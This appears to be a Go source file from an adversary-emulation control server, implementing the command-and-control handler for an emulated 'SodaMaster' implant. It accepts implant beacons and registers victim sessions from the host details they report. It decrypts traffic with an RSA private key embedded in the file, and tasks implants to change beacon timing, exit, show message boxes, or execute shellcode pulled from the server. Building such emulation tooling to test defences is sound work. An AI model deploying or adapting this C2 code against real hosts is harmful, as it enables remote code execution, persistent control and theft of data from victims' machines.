package sodamaster

import (
    "crypto/md5"
    "crypto/rsa"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "net"
    "regexp"
    "strconv"
    "strings"

    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/util"
    "attackevals.mitre-engenuity.org/control_server/logger"
)

const (
    serverPrivateKey = "MIIEpAIBAAKCAQEAvIXC/uSF6GaQkOzFjS9CSVeklJT1rrtwBivASNV3ZjPWdivJeUzkIeKHuoGQrg3ehAoF0ktiVTKzY9S7CJu6cRVCXRC7Gpp8cl/wa1XdtnRnbz9Ltt+GSmywxGrsLCvNfPxZGUPbrJa/HBmZk/dbDhCwwszE2o0l5r/oVOnDUceJV4wTX8hFDpz+PrIIPm4WbtCDJUo9PhXGojSploCacJPE6EtMpWZAFdrsR4qJ3q64YCR4o8aK5Ag+Pda+MxYtvm6NL+JzPpd2Ww7ZFKOvA3F0bABccP0cA3a5rs11FOotVe6roK9sUYbaagVkREU84W4tFDYTgvi5MXwzprXJqQIDAQABAoIBAEMSwDbZ7X6rByJY60x5FPdtNEQc33Bkhc3cQRRoxotZRCNVHuCGZ+BabXoA4Q3cJ2AJBNs2MO0pFcQeCtFcPrA/JRZhfoBPmJlE4w/9Q93HeomNFo4g5vGRzC6F8DMi/oBKdBTWHNFB7Qq9XPPVHNNbQth77Enp0CNSAgI8DV8Jp5f/PtVn2hUVCEnH5TkCcmB/dyFPhnlCv1l7NVfRE0pVLgV0BvqkiQww362GTyt1QZD7AaHcH6x6GIoGHT5FDv4kyj7mZYKXNgX6ahWFLpBQ2yOwfu0FEfvvWNV8yiAnAEl4JZkMJL7jAckPjbYc0HhuUHGFiXr605AEc7a40lUCgYEA6ApL1BPEQ2x4c0pSqi0aKIjo9Fvqpy64A9geErlFD6dRC9B1hlZ48RCbLZFFJ9RHhaOG60ECztIZ2M8uBnoSQZ8/FB5wCk3yvzb5WbcjLT91IZOYmGIbi5T5ZBwzh1lvNFW10SVodEM3jPYAbpKhRVc4EVH3/7bvZJdG17TQSusCgYEAz/0gjWrLJrMX3mt7oK3T6JiDtPEF0sQRrg7uoJSXFbYebuOpag3vm1E/TqegAgflLBpQ3g/R744007ok7rOv6EQT4M1ejiBcmQuNRJsR5wJuI5txO+wkqyH7xbREcxMGw9AYiopdiIecGBU+cuoUDquRel4aKiUS3YkdIZbJMLsCgYEA34WDlDDSX8yunwiaZvn5d9Ci7zlX6mIzuuhF1+2GnFSl2sadX6IO8ND5WsTUpFB18UMcZaSDau2zHko9YNnYmkQnxF6puRNrYk03l/e1uBGn6IdAeJIRTL1eG9SawqghWn2yHl11qIFTksMqmVlAZwZkqTKXvknfg7vB72prN68CgYA+W7Uj0S4Bd1ajr/QL87ICHZ/3YwAM9g4a8o0nBgXaU5UCSC2mB3GcTpq9eVJm6XkTZPxz56hYu3kpNbkW/Da0W5zeHJTJ5ff9RtJfDGMssLTW5iboAV/pEzJKT0bqfXzcvoptFxj98zKgodXsXDQRRe1DE+2iTyU92Hssc+n0OwKBgQCsccT6zGyolG+uLAIWa74KWoYQCR0BPkTjinbyeisMjEKeXcmmnbMQHASpEdYpZuwrJZBgO1sVVcbI38Sb2pBoemn/xNSZvgJMuA5mY8DdDIm0lP/rakhEWlcFjeVoFa6ikK8h89RtVZ4bWWCE54er0wmL20v9yetc56g8wvZV+g=="
    IDENTIFIER       = "534F44414D4153544552"
    identifierLen    = 20
    hexUuidLen       = 64
    discoveryTask    = "{\"id\":\"d\"}" // Used only by the handler to set the discovery data task when the implant registers

    //Commands
    cmdSetSleep = "l" // Change beacon timer
    cmdExit     = "x" // Exit the implant application on the target
    cmdMsgBox   = "w" // Pop a message box
    cmdExeShell = "s" // Execute shellcode
    cmdBeacon   = "b" // Beacon to the implant
)

// Represents SodaMaster handler. Will implement util.Handler interface
type sodaMasterHandler struct {
    restAPIaddress       string
    l                    net.Listener
    serverAddress        string
    commandNumbers       map[string]int
    pendingCommandOutput map[string]map[int]bool
    encryptionEnabled    bool
    rsaPrivateKey        *rsa.PrivateKey
    rc4Keys              map[string][]byte
}

// Represents task for the implant
type Task struct {
    id          string
    cmd         string
    lenCmd      int32
    args        string
    lenArgs     int32
    payloadName string
    payloadPath string
    payloadData []byte
    lenPayload  int32
}

// Represents the implant response to C2
type ImplantData struct {
    UUID          string `json:",omitempty"`
    User          string `json:",omitempty"`
    ComputerName  string `json:",omitempty"`
    PID           int    `json:",omitempty"`
    DateExec      string `json:",omitempty"`
    SocketName    string `json:",omitempty"`
    PrivilegeFlag string `json:",omitempty"`
    OSBuild       string `json:",omitempty"`
    RC4Key        []byte `json:",omitempty"`
    Data          string `json:",omitempty"`
    DataLength    int32  `json:",omitempty"`
    Beacon        bool   `default:"false"`
}

// Factory method for creating handler
func sodaMasterHandlerFactory() *sodaMasterHandler {
    //import the server's private rsa key
    privKey, err := ImportRsaPrivKey()
    if err != nil {
        panic("Failed to import RSA private key: " + err.Error())
    }

    return &sodaMasterHandler{
        commandNumbers:       make(map[string]int),
        pendingCommandOutput: make(map[string]map[int]bool),
        rc4Keys:              make(map[string][]byte),
        rsaPrivateKey:        privKey,
    }
}

func init() {
    util.AvailableHandlers["sodamaster"] = sodaMasterHandlerFactory()
}

// Starts the handler
func (s *sodaMasterHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    serverAddress, err := config.GetHostPortString(configEntry)
    if err != nil {
        return err
    }
    s.serverAddress = serverAddress
    logger.Info("Starting SodaMaster TCP Handler")

    // Set the restAPI address
    s.restAPIaddress = restAddress

    // Encryption switch for unit testing purposes
    encryptionEntry, ok := configEntry["encryption"]
    if !ok {
        s.encryptionEnabled = false
    } else {
        encryption, ok := encryptionEntry.(bool)
        if ok {
            s.encryptionEnabled = encryption
        } else {
            return errors.New("Encryption setting must be a boolean value.")
        }
    }
    
    // Start the TCP listener
    s.l, err = net.Listen("tcp", s.serverAddress)
    if err != nil {
        panic(err)
    }
    go s.startListener()

    return nil
}

// Stops the handler and clears any needed data
func (s *sodaMasterHandler) StopHandler() error {
    logger.Info("Killing SodaMaster TCP server")
    s.l.Close()
    return nil
}

// TCP Listener
func (s *sodaMasterHandler) startListener() {
    // Listen for incoming connections.
    fmt.Println(s.serverAddress)
    defer s.l.Close()

    for {
        // Listen for an incoming connection
        conn, err := s.l.Accept()
        if err != nil {
            return
        }
        // Handle connections in a new goroutine
        go func(conn net.Conn) {
            packet := ""
            buf := make([]byte, 1024*1024)
            for {
                len, err := conn.Read(buf)
                if err != nil {
                    if err != io.EOF {
                        fmt.Printf("Error reading: %#v\n", err)
                        return
                    }
                    break
                }
                packet += string(buf[:len])
            }

            // Parse the data sent by the implant, and either forward to handleBeacon or handleResponse.
            implantData, err := s.parseImplantData(packet)
            if err != nil {
                logger.Error(fmt.Sprintf("Failed to parse implant data: %s", err.Error()))
                return
            }

            var response string
            if implantData.Beacon {
                response, err = s.handleBeacon(*implantData)
            } else {
                response, err = s.handleResponse(*implantData)
            }

            if err != nil {
                logger.Error(fmt.Sprintf("Failed to handle implant with UUID %s beacon/response: %s", implantData.UUID, err.Error()))
                response = hex.EncodeToString([]byte(implantData.UUID + cmdBeacon))
            }

            // RC4 encrypt the response
            rc4Key := implantData.RC4Key
            if len(rc4Key) == 0 {
                rc4Key = s.rc4Keys[implantData.UUID]
            }
            encryptedResponse, err := rc4Encrypt([]byte(response), rc4Key)
            if err != nil {
                logger.Error(err.Error())
            }

            conn.Write([]byte(encryptedResponse))
            conn.Close()
        }(conn)
    }
}

func (s *sodaMasterHandler) hasImplantSession(uuid string) bool {
    _, ok := s.commandNumbers[uuid]
    return ok
}

func (s *sodaMasterHandler) storeImplantSession(uuid string) error {
    if s.hasImplantSession(uuid) {
        return errors.New(fmt.Sprintf("Session %s already exists.", uuid))
    }
    s.commandNumbers[uuid] = 1
    s.pendingCommandOutput[uuid] = make(map[int]bool)
    return nil
}

func createNewSessionDataBytes(uuid string, computerName string, user string, pid int) []byte {
    jsonStr, err := json.Marshal(map[string]interface{}{"guid": uuid, "user": user, "hostName": computerName, "pid": pid})
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to create JSON info for session for UUID %s: %s", uuid, err.Error()))
        return nil
    }
    return []byte(jsonStr)
}

// removeImplantSession removes the implant's uuid from all relevant data structures
//
//	uuid: the uuid of the implant to be removed
//
// returns any errors if they occur
func (s *sodaMasterHandler) removeImplantSession(uuid string) error {
    if !s.hasImplantSession(uuid) {
        return errors.New(fmt.Sprintf("Session %s already deleted.", uuid))
    }
    if err := util.ForwardRemoveImplant(s.restAPIaddress, uuid); err != nil {
        return err
    }
    delete(s.rc4Keys, uuid)
    delete(s.commandNumbers, uuid)
    delete(s.pendingCommandOutput, uuid)
    return nil
}

// registerNewImplant creates a new session for the implant and registers it with the restAPI
//
//	uuid: the uuid of the implant to be registered, user: user name of victim, computerName: computer name of victim machine,
//	pid: the implant's process ID, rc4Key: the shared RC4 key used to encrypt comms to/from the implant
//
// returns any errors if they occur
func (s *sodaMasterHandler) registerNewImplant(uuid string, user string, computerName string, pid int, rc4Key []byte) error {
    s.rc4Keys[uuid] = rc4Key
    implantData := createNewSessionDataBytes(uuid, computerName, user, pid)
    restResponse, err := util.ForwardRegisterImplant(s.restAPIaddress, implantData)
    if err != nil {
        return err
    }
    if err = s.storeImplantSession(uuid); err != nil {
        return err
    }
    logger.Info(restResponse)
    logger.Success(fmt.Sprintf("Successfully created session for implant %s.", uuid))

    //set task for the implant to receive the discovery data
    _, err = setTask(discoveryTask, uuid, "http://"+s.restAPIaddress+"/api/v1.0/")
    if err != nil {
        return err
    }
    return nil
}

// updateImplantSession updates the specified implant session with the implant's PID (functionality can be extended to update other values)
//
// uuid: the uuid of the implant session to be updated, pid: the implant's process ID
//
// returns any errors if they occur
func (s *sodaMasterHandler) updateImplantSession(uuid string, pid int) error {
    sessionData, err := json.Marshal(map[string]interface{}{"pid": pid})
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to create JSON info for session for UUID %s: %s", uuid, err.Error()))
        return nil
    }
    restResponse, err := util.ForwardUpdateSession(s.restAPIaddress, uuid, sessionData)
    if err != nil {
        return err
    }
    logger.Info(restResponse)
    logger.Success(fmt.Sprintf("Successfully updated session for implant %s.", uuid))

    return nil
}

// extractTaskParts fills out a Task struct with the information from the task string
//
//	task: Task struct to fill out with tasking information
//	taskString: JSON string received from the C2 server's REST API
//
// returns any errors that may occur
func (s *sodaMasterHandler) extractTaskParts(taskString string, task *Task) error {
    trimmedTask := strings.TrimSpace(taskString)
    var taskData map[string]interface{}
    err := json.Unmarshal([]byte(trimmedTask), &taskData)
    if err != nil {
        return err
    }

    // Extract the command ID
    if cmdIDVal, ok := taskData["id"]; ok {
        parsedCmdID, castOk := cmdIDVal.(string)
        if !castOk {
            return errors.New(fmt.Sprintf("Bad command ID: %v", cmdIDVal))
        }
        task.id = parsedCmdID
    } else {
        return errors.New("Command ID not provided in task string")
    }

    //Extract payload data / length
    payloadNameStr, ok := taskData["payload"]
    if !ok {
        payloadNameStr = ""
    }
    task.payloadName = strings.TrimSpace(payloadNameStr.(string))
    if len(task.payloadName) > 0 {
        logger.Info("Fetching requested payload for task: ", task.payloadName)
        task.payloadData, err = util.ForwardGetFileFromServer(s.restAPIaddress, task.payloadName)
        if err != nil {
            return err
        }
    } else {
        task.payloadData = []byte{}
    }
    task.lenPayload = int32(len(task.payloadData))

    //Extract process
    if commandStr, ok := taskData["payloadPath"]; ok {
        task.payloadPath = strings.TrimSpace(commandStr.(string))
    }

    //Extract args
    if commandStr, ok := taskData["args"]; ok {
        task.args = strings.TrimSpace(commandStr.(string))
        task.lenArgs = int32(len(task.args))
    }

    // Extract command info
    if commandStr, ok := taskData["cmd"]; ok {
        task.cmd = strings.TrimSpace(commandStr.(string))
        task.lenCmd = int32(len(task.cmd))
    }

    return nil
}

// converTaskToResponse builds the hex string reponse task packet to be sent to the implant
//
//	uuid: the session id of the implant, taskString: the JSON string with tasking info fetched from the control server
//
// returns a hex string containing tasking information to be sent to the implant or an error
func (s *sodaMasterHandler) convertTaskToResponse(uuid, taskString string) (string, error) {

    //check for existing session and pending command outputs
    if !s.hasImplantSession(uuid) {
        return "", errors.New(fmt.Sprintf("No existing session for implant %s.", uuid))
    }
    if _, ok := s.pendingCommandOutput[uuid]; !ok {
        s.pendingCommandOutput[uuid] = make(map[int]bool)
    }

    var task Task
    var err error
    commandNum := -1

    if len(taskString) > 0 {
        err = s.extractTaskParts(taskString, &task)
        if err != nil {
            return "", err
        }
        commandNum = s.commandNumbers[uuid]
        s.pendingCommandOutput[uuid][commandNum] = true
        s.commandNumbers[uuid] = commandNum + 1
    } else {
        task.id = cmdBeacon
    }

    //Build the hexData tasking package for the implant
    hexString := hex.EncodeToString([]byte(uuid))
    switch task.id {
    case cmdBeacon:
        hexString += hex.EncodeToString([]byte(cmdBeacon))
        break
    case cmdMsgBox:
        hexString += formatTask(cmdMsgBox, task.lenCmd, task.cmd)
        break
    case cmdExit:
        hexString += formatTask(cmdExit, 0, "")
        s.removeImplantSession(uuid)
        break
    case cmdSetSleep:
        hexString += formatTask(cmdSetSleep, task.lenCmd, task.cmd)
        break
    case cmdExeShell:
        if task.lenArgs > 0 || task.lenPayload > 0 {
            //Get the shellcode to send to the implant and format the task
            shellcodeBytes, err := prepExecutionTask(&task)
            if err != nil {
                return "", err
            }
            hexString += formatShellcodeTask(cmdExeShell, shellcodeBytes)
        } else {
            return "", errors.New("Can not set execution task without CLI arguments or payload name.")
        }
        break
    default:
        hexString += hex.EncodeToString([]byte(cmdBeacon))
        break
    }
    return hexString, nil
}

// handleBeacon registers a new session or notifies that a session already exists and fetches a task for the implant.
//
//	implantData: the struct containing implant information (uuid, user, computerName, etc.)
//
// returns the beacon repsonse to be sent back to the implant and any errors that may occur
func (s *sodaMasterHandler) handleBeacon(implantData ImplantData) (string, error) {
    firstPacket := false

    //Check for existing uuid, generate one if it does not already exist
    if implantData.UUID == "" {
        if implantData.User != "" && implantData.ComputerName != "" {
            buf := md5.Sum([]byte(implantData.User + implantData.ComputerName))
            implantData.UUID = hex.EncodeToString(buf[:])
            firstPacket = true
        } else {
            return "", errors.New(fmt.Sprintf("Implant's first packet must contain the user and computer names. Packet is not valid."))
        }
    }

    if firstPacket {
        //Check if session already exists in the case of an implant crash, if so remove the session and register again
        if s.hasImplantSession(implantData.UUID) {
            s.removeImplantSession(implantData.UUID)
        }
        logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session...", implantData.UUID))
        err := s.registerNewImplant(implantData.UUID, implantData.User, implantData.ComputerName, implantData.PID, implantData.RC4Key)
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to register implant session: %s", err.Error()))
            return "", err
        }
        logger.Info(fmt.Sprintf("Session created for implant %s", implantData.UUID))
    } else {
        logger.Info(fmt.Sprintf("Received beacon from existing implant %s.", implantData.UUID))
    }

    //Dump the initial discovery data if this is the implant's first packet and then return the session ID
    if firstPacket {
        jsonStr, _ := json.Marshal(implantData)
        logger.Info(fmt.Sprintf("Initial data received from implant: \n%s", string(jsonStr)))
        response, err := s.convertTaskToResponse(implantData.UUID, "")
        if err != nil {
            logger.Error(fmt.Sprintf("Failed to formulate response for implant: %s", implantData.UUID))
        }
        return response, err
    }

    // Forward Beacon to CALDERA
    if config.IsCalderaForwardingEnabled() {
        apiResponse, err := util.ForwardImplantBeacon(implantData.UUID, s.restAPIaddress)
        if err != nil {
            logger.Error(fmt.Sprintf("Error occured while forwarding implant beacon to CALDERA for session %s: %s", implantData.UUID, err.Error()))
        } else {
            logger.Info(fmt.Sprintf("Successfully forwarded implant beacon for session %s to CALDERA: %s", implantData.UUID, apiResponse))
        }
    }

    //Fetch the implant task
    task, err := util.ForwardGetTask(s.restAPIaddress, implantData.UUID)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
        return "", err
    } else if len(task) == 0 {
        response, err := s.convertTaskToResponse(implantData.UUID, "")
        return response, err
    }
    logger.Info("New task received for UUID: ", implantData.UUID)

    //Format the task
    response, err := s.convertTaskToResponse(implantData.UUID, task)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to convert task to response: %s", err.Error()))
        return "", err
    }
    logger.Info("Sending new task to implant: " + implantData.UUID)

    return response, nil
}

// handleResponse logs the implants task response to the server
//
//	implantData: struct containing the data sent by the implant
//
// returns any errors that may occur
func (s *sodaMasterHandler) handleResponse(implantData ImplantData) (string, error) {

    //Check for any pending task outputs
    _, pendingOutput := s.pendingCommandOutput[implantData.UUID]
    if !(pendingOutput) {
        return "", errors.New(fmt.Sprintf("Implant %s does not have any tasks pending output.", implantData.UUID))
    }

    var taskOutput []byte
    if implantData.DataLength > 0 {
        taskOutput, _ = base64.StdEncoding.DecodeString(implantData.Data)
    } else {
        //this is the recon packet, print out all the data and update the session table
        taskOutput, _ = json.Marshal(implantData)
        s.updateImplantSession(implantData.UUID, implantData.PID)
    }
    //forward the task output the to rest API
    response, err := util.ForwardTaskOutput(s.restAPIaddress, implantData.UUID, taskOutput)
    if err != nil {
        logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
        return "", err
    }
    logger.Success(response)

    //generate response to the implant
    response, _ = s.convertTaskToResponse(implantData.UUID, "")

    return response, nil
}

// parseImplantData takes the data sent by the implant, decrypts it and parses out the relevant variables
//
//	data: the raw encrypted data sent by the implant
//	length: the length of the encrypted implant data
//
// returns a struct containing the implant data
func (s *sodaMasterHandler) parseImplantData(encryptedData string) (*ImplantData, error) {

    var data string
    var err error
    firstPacket := false
    implantData := new(ImplantData)

    //Encryption switch for unit testing
    if s.encryptionEnabled {
        data, firstPacket, err = decrypt(encryptedData, s.rsaPrivateKey, s.rc4Keys)
        if err != nil {
            return nil, err
        }
    } else {
        data = encryptedData
        if strings.Contains(data, IDENTIFIER) {
            firstPacket = true
        }
    }

    //Check for the identifier, first packet MUST contain the identifier to be considered valid traffic
    if firstPacket && (!strings.Contains(data, IDENTIFIER)) {
        return nil, errors.New(fmt.Sprintf("Implant's first packet must contain the identifier. Packet is not valid."))
    }

    //If it is the first packet, set the uuid to an empty string. Else initialize the UUID.
    var splitData []string
    if firstPacket {
        implantData.UUID = ""
        implantData.Beacon = true
        if identifierLen > len(data) {
            return nil, errors.New("Data length invalid.")
        }
        splitData = regexp.MustCompile(`..`).FindAllString(data[identifierLen:], -1)
    } else {
        if hexUuidLen > len(data) {
            return nil, errors.New("Data length invalid.")
        }
        uuid, _ := hex.DecodeString(data[:hexUuidLen])
        implantData.UUID = string(uuid)
        if !s.hasImplantSession(implantData.UUID) {
            return nil, errors.New(fmt.Sprintf("No existing session for implant with UUID: %s. Packet is not valid.", implantData.UUID))
        }
        splitData = regexp.MustCompile(`..`).FindAllString(data[hexUuidLen:], -1)
    }

    //loop through split data
    for len(splitData) > 0 {

        id, _ := strconv.ParseInt(splitData[0], 16, 64)
        // ID of 98 signals a beacon from the implant, no more assocciated data
        if id == 98 {
            implantData.Beacon = true
            return implantData, nil
        }

        // If the ID is not 98 the data should have a length of at least 4
        if len(splitData) < 4 {
            return implantData, nil
        }

        // Get the length of the next piece of data and then the data itself
        lenOfLen, dataLen, data, err := decodeHex(splitData)
        if err != nil {
            return nil, err
        }
        dataStart, dataEnd := 2+lenOfLen, 2+lenOfLen+int64(dataLen)

        switch id {
        case 3:
            implantData.User = data
            break
        case 4:
            implantData.PID, _ = strconv.Atoi(data)
            break
        case 5:
            implantData.DateExec = data
            break
        case 6:
            var rc4Key string
            rc4KeyBytes, _ := base64.StdEncoding.DecodeString(data)
            jsonRC4Key, _ := json.Marshal(rc4KeyBytes)
            json.Unmarshal(jsonRC4Key, &rc4Key)
            implantData.RC4Key, _ = hex.DecodeString(rc4Key)
            break
        case 7:
            implantData.ComputerName = data
            break
        case 8:
            implantData.SocketName = data
            break
        case 9:
            implantData.PrivilegeFlag = data
            break
        case 40:
            implantData.OSBuild = data
            break
        case 99:
            implantData.Data = data
            implantData.DataLength = int32(len(data))
            break
        }

        if int64(len(splitData[dataStart:])) < dataEnd {
            break
        }
        splitData = splitData[dataEnd:]
    }
    return implantData, nil
}
